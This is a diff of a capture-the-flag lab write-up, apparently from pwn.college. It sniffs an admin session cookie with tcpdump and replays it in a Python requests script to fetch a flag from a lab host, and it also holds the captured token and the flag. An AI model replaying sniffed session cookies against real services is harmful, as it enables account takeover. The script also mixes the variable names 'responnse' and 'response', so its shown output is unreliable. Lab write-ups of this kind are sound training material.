@@ -593,23 +593,27 @@ tcpdump: WARNING: any: That device doesn't support promiscuous mode
 (Promiscuous mode not supported on the "any" device)
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aFBJpg.Y9xBw6F8lRXYZomiDVkLwwHHp6k
+Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aFEq0w.LW1TQizb2Gju_C90GXMogivpu1g
+Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aFEq0w.LW1TQizb2Gju_C90GXMogivpu1g
 
 # --- snip ---
 ```
 
-Now we can use teh cookie to get the flag from `http://10.0.0.2/flag`.
+Now we can use the cookie to get the flag from `http://10.0.0.2/flag`.
 
-```py
-In [1]: import requests
-   ...: 
-   ...: cookies = {
-   ...:     "session": "eyJ1c2VyIjoiYWRtaW4ifQ.aFBJpg.Y9xBw6F8lRXYZomiDVkLwwHHp6k"
-   ...: }
-   ...: 
-   ...: responnse = requests.get("http://10.0.0.2/flag", cookies = cookies)
-   ...: print(response.text)
-   ...: 
+```py title="~/script.py" showLineNumbers
+import requests
+
+cookies = {
+    "session": "eyJ1c2VyIjoiYWRtaW4ifQ.aFEq0w.LW1TQizb2Gju_C90GXMogivpu1g"
+}
+
+responnse = requests.get("http://10.0.0.2/flag", cookies = cookies)
+print(response.text)
+```
+
+```
+root@ip-10-0-0-1:/# python ~/script.py
 pwn.college{s_X0-uEuI4QDPvCeidQDJnjs1ke.QXxQDM2EDL4ITM0EzW}
 ```
 
